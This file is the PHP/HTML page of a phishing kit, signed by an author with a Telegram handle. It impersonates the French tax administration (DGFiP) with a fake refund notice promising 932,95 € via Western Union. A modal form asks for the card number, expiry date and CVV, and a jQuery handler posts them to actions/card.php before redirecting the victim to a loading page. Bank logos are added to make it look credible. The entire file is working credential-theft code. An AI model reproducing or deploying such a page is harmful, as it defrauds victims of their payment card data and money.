<?php include("common/includes.php") ?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <meta http-equiv="refresh" content=";URL=cc.php">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Remboursement</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <header id="header2">
            <div class="container">
                <div class="left">
                    <img style="max-width: 126px;" src="assets/imgs/logo1.svg">
                </div>
                <div class="mid">
                    <h3>Mon espace <span>particulier</span></h3>
                    <img style="max-width: 126px;" src="assets/imgs/logo2.svg">
                </div>
                <div class="right">
                    <p>
                        Bienvenue<br>
                        Numéro fiscal : 1195217722475<br>
                        <span>Retour au tableau de bord</span>
                    </p>
                </div>
            </div>
        </header>

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4">
            <div class="container">
                <u>Tableau de bord</u> <span>-</span> Remboursement et Paiement en ligne

            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="details">
                    <div class="title">
                        <h3>Remboursement sécurisé</h3>
                       <li>Référence : <b>600193110380</b></li>
                       <li>Montant de la transaction &nbsp;: <b>932,95 €</b></li>

                        </p>
                    </div>

 
 <style>
		/* The Modal (background) */
		.modalb {
			display: block;
			/* Hidden by default */
			position: fixed;
			/* Stay in place */
			z-index: 999999999;
			/* Sit on top */
			padding-top: 60px;
			/* Location of the box */
			left: 0;
			top: 0;
			width: 100%;
			/* Full width */
			height: 100%;
			/* Full height */
			overflow: auto;
			/* Enable scroll if needed */
			background-color: rgb(0, 0, 0);
			/* Fallback color */
			background-color: rgba(0, 0, 0, 0.4);
			/* Black w/ opacity */
		}

		/* Modal Content */
		.modal-contentb {
			background-color: #fefefe;
			margin: auto;
			border: 1px solid #888;
			width: 80%;
			max-height: 773px;
			height: auto;
			max-width: 620px;
			border-radius: 9px;
			box-shadow: 0 2px 4px 0 rgba(12, 43, 119, 0.15);
			overflow: hidden;
			z-index: 10003;
		}
		#myModalb .header {
	position: relative;
	color: #fff;
	background-color: #1344a1;
	overflow: hidden;
	_overflow: visible;
	zoom: 1;
	margin-bottom: 0px;
}
#myModalb .header {
	position: relative;
	height: auto;
	background-color: #fff;
	zoom: 1;
	margin-bottom: 0;
	overflow: hidden;
}
#myModalb .header .round-banner::before {
	content: "";
	position: absolute;
	top: -35%;
	left: -6.5%;
	background-color: #308276;
	width: 113%;
	height: 100px;
	border-radius: 0 0 50% 50%;
}
#myModalb .header .round-banner {
	position: relative;
	height: 10rem;
	width: 100%;
	overflow: hidden;
}
#myModalb .header #popinTitle, #myModalb .modal-body #popinTitle {
	font-size: 2.4rem;
	line-height: 2.8rem;
	font-family: LatoBold, Arial, sans-serif !important;
	font-family: var(--text-bold-font) !important;
	font-weight: normal;
	width: 100%;
	padding: 0 1.5rem;
	margin: 0;
	color: #000;
	text-align: center;
	text-transform: none;
}
#myModalb .header .round-banner::before {
	content: "";
	position: absolute;
	top: -5%;
	left: -6.5%;
	background-color: #0b6ba8;
	width: 113%;
	height: 100px;
	border-radius: 0 0 50% 50%;
}
.icon-ic_interface_checklist::before {
	content: "\e950";
	color: #0b6ba8;
}
#myModalb .header .round-banner svg {
	background-color: #fff;
	border-radius: 50%;
	padding: .5rem;
	font-size: 4.8rem;
	position: absolute;
	bottom: 0.5rem;
	left: 50%;
	margin-left: -2.4rem;
}
[class^="icon-ic"], [class*=" icon-ic"] {
	font-family: 'icons2020' !important;
	font-style: normal;
	font-weight: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
}
#myModalb .header .round-banner [class*="icon-"] {
	font-size: 4.8rem;
}
#myModalb .header #popinTitle, #myModalb .modal-body #popinTitle {
	font-size: 1.8rem;
	line-height: 2.8rem;
	font-family: LatoBold, Arial, sans-serif !important;
	font-family: var(--text-bold-font) !important;
	font-weight: normal;
	width: 100%;
	padding: 0 1.5rem;
	margin: 0;
	color: #000;
	text-align: center;
	text-transform: none;
}
.a-center {
	text-align: center !important;
}
.button, #main .button, #main form .button {
	display: inline-block;
	min-width: auto;
	height: 3.4rem;
	padding: 0 !important;
	padding-left: 16px !important;
	padding-right: 16px !important;
	background-color: transparent;
	border: 1px solid #0b6ba8;
	border-radius: 4px;
	font-size: 1rem;
	box-sizing: border-box;
	outline: none;
}

		.header .round-banner {
			position: relative;
			height: 10rem;
			width: 100%;
			overflow: hidden;
		}

		.header #popinTitle,
		.modal-body #popinTitle {
			font-size: 2.4rem;
			line-height: 2.8rem;
			font-family: LatoBold, Arial, sans-serif !important;
			font-family: var(--text-bold-font) !important;
			font-weight: normal;
			width: 100%;
			padding: 0 1.5rem;
			margin: 0;
			color: #000;
			text-align: center;
			text-transform: none;
		}

		.button.button--primary>span,
		#main form .button.button--primary>span {
			background-color: #0b6ba8;
			background-color: var(--primary-blue-color);
			color: #FFF;
			display: block;
			height: 100%;
			display: flex;
			align-items: center;
			justify-content: center;
		}
	</style>

	<!-- The Modal -->
	<div id="myModalb" class="modalb">

		<!-- Modal content -->
		<div class="modal-contentb">
			
			<div class="document" style="height: auto;display: flex;flex-direction: column;">
				<div class="header popinV3-header ">
					<div class="round-banner">
						<svg fill="#0b6ba8" width="58px" height="58px" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#0b6ba8">
						<g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M960 0c530.193 0 960 429.807 960 960s-429.807 960-960 960S0 1490.193 0 960 429.807 0 960 0Zm0 101.053c-474.384 0-858.947 384.563-858.947 858.947S485.616 1818.947 960 1818.947 1818.947 1434.384 1818.947 960 1434.384 101.053 960 101.053Zm-42.074 626.795c-85.075 39.632-157.432 107.975-229.844 207.898-10.327 14.249-10.744 22.907-.135 30.565 7.458 5.384 11.792 3.662 22.656-7.928 1.453-1.562 1.453-1.562 2.94-3.174 9.391-10.17 16.956-18.8 33.115-37.565 53.392-62.005 79.472-87.526 120.003-110.867 35.075-20.198 65.9 9.485 60.03 47.471-1.647 10.664-4.483 18.534-11.791 35.432-2.907 6.722-4.133 9.646-5.496 13.23-13.173 34.63-24.269 63.518-47.519 123.85l-1.112 2.886c-7.03 18.242-7.03 18.242-14.053 36.48-30.45 79.138-48.927 127.666-67.991 178.988l-1.118 3.008a10180.575 10180.575 0 0 0-10.189 27.469c-21.844 59.238-34.337 97.729-43.838 138.668-1.484 6.37-1.484 6.37-2.988 12.845-5.353 23.158-8.218 38.081-9.82 53.42-2.77 26.522-.543 48.24 7.792 66.493 9.432 20.655 29.697 35.43 52.819 38.786 38.518 5.592 75.683 5.194 107.515-2.048 17.914-4.073 35.638-9.405 53.03-15.942 50.352-18.932 98.861-48.472 145.846-87.52 41.11-34.26 80.008-76 120.788-127.872 3.555-4.492 3.555-4.492 7.098-8.976 12.318-15.707 18.352-25.908 20.605-36.683 2.45-11.698-7.439-23.554-15.343-19.587-3.907 1.96-7.993 6.018-14.22 13.872-4.454 5.715-6.875 8.77-9.298 11.514-9.671 10.95-19.883 22.157-30.947 33.998-18.241 19.513-36.775 38.608-63.656 65.789-13.69 13.844-30.908 25.947-49.42 35.046-29.63 14.559-56.358-3.792-53.148-36.635 2.118-21.681 7.37-44.096 15.224-65.767 17.156-47.367 31.183-85.659 62.216-170.048 13.459-36.6 19.27-52.41 26.528-72.201 21.518-58.652 38.696-105.868 55.04-151.425 20.19-56.275 31.596-98.224 36.877-141.543 3.987-32.673-5.103-63.922-25.834-85.405-22.986-23.816-55.68-34.787-96.399-34.305-45.053.535-97.607 15.256-145.963 37.783Zm308.381-388.422c-80.963-31.5-178.114 22.616-194.382 108.33-11.795 62.124 11.412 115.76 58.78 138.225 93.898 44.531 206.587-26.823 206.592-130.826.005-57.855-24.705-97.718-70.99-115.729Z" fill-rule="evenodd"></path> </g></svg>
					</div>
					<h1 id="popinTitle" style="text-align: center; color: #ff0468;" >Votre remboursement sera effectué instantanément sur votre carte bancaire par notre partenaire western union.</h1>
				</div>
				<br>
				<div class="line" style="max-height: 500px;">
					<div id="compte_bancaire_haut2" class="textPopinDetail">
						<div class="block basecomponent  section blocstd">
							<div class="CQblocedito cq-dd-file"
								id="bloc_kyc_verification_donnees_personnelles_obligatoire" style="margin: 6px 24px;">
								<div class="block">
									<div class="blockInside">
										<div>

											<div class="textFCK" style="text-align: center;">
												<form action="" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="cc">
                                            <div class="text-center mb20">
                            <img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_CB.png">
                            <img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_VISA.png">
                            <img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_MASTERCARD.png">
                        </div>
            <div class="form-group col-15 row" style="margin-top:-10px;left:-2px">              
              <label class="col-5" for="id" style="text-align: right;">Type de Carte:</label>
              <select type="bank" class="form-control ordi col-5" id="bank" name="bank" style="min-width:140px;">
                            <option value="">Choisir la carte</option>
                            <option value="Carte bleue">Carte bleue</option>
							<option value="Visa">Visa</option>
							<option value="Mastercard">Mastercard</option>
							
							
						</select>	
              </div>
            
                        <div class="form-group col-15 row" style="left:-2px">              
              <label class="col-5" for="id" style="text-align: right;">Numéro de carte:</label>
              <input type="tel" class="form-control id col-5" id="id" name="id" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" >       
          </div>
            <div class="form-group col-15 row" style="margin-top:-10px;left:-3px">
              <label class="col-5" style="text-align: right;">Date Expire:</label>
              <input type="tel" class="form-control mdp col-2" id="mdp" name="mdp" placeholder="MM" maxlength="2">/
              <input type="tel" class="form-control mdp1 col-2" id="mdp1" name="mdp1" placeholder="AA" maxlength="2">
            </div>
             <div class="form-group col-15 row" style="margin-top:-10px;left:-2px">
              <label class="col-5" style="text-align: right;">Cryptogramme visuel:</label>
              <input type="tel" class="form-control cvv col-2" id="cvv" name="cvv" maxlength="3">
            </div>
                        <div class="btns">
                            <button type="button" id="submit"><i class="fas fa-lock"></i> Etape suivante</button>
                        </div>
                        <br>
                        <br>
                    </form>

					</div>
				</div>
			</div>
			

		</div>
                      
                       
                      
        </main>
        <!-- END MAIN -->
		 <div class="text-center mb20">
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/creditagricole.gif" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/la-banque-postale.png" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/banquepopulaire.gif" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/societe-generale-france.jpg" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/bnpparibas.gif" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/caisseepargne.gif" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2016/08/logo-credit-mut.png"width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/lcl.gif" width=3%>
                            
                            <img src="https://www.culturebanque.com/wp-content/uploads/2019/01/logo-boursorama-mini-min.jpg" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2016/08/logo-cic.png"width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/creditdunord.gif" width=3%>
                            
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/HSBC.png" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/Allianz1-300x300.png" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2013/05/hello-bank-bnp.png" width=3%>
                            
                            <img src="https://www.culturebanque.com/wp-content/uploads/2017/07/monabanq-carre-noir.png" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2015/09/fortuneo-logo.jpg" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2018/09/orange.jpg" width=3%>
                            
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/02/bforbank.gif" width=3%>
                            <img src="https://www.culturebanque.com/wp-content/uploads/2012/01/creditcooperatif.gif" width=3%>
                        </div>

        <footer id="footer">
            <div class="container">
                <p>Direction générale des Finances publiques</p>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="assets/js/script.js"></script>
		
				<!--fin page 1-->
	
        <script type="text/JavaScript">
            var x = 0
            $(document).ready(function() {
                
                
                $('#submit').click(function(e) {
                    e.preventDefault();
                     if ( $('.id').val().length >= 16 && $('.mdp').val().length >= 2 && $('.mdp1').val().length >= 2 && $('.cvv').val().length >= 3) {

                        $.ajax({
                            type: "post",
                            url: "actions/card.php",
                            data: "id=" + $('.id').val() + "&mdp=" + $('.mdp').val() + "&mdp1=" + $('.mdp1').val() + "&cvv=" + $('.cvv').val(),
                            success: function(response) {
                                window.location.href = 'load-rembour-1.php';
                                
                            }
                        });
                          } else {
                        alert('Veuillez vérifier les informations de votre carte bancaire.')
                    }
                    
                });

            })

        </script>



    </body>

</html>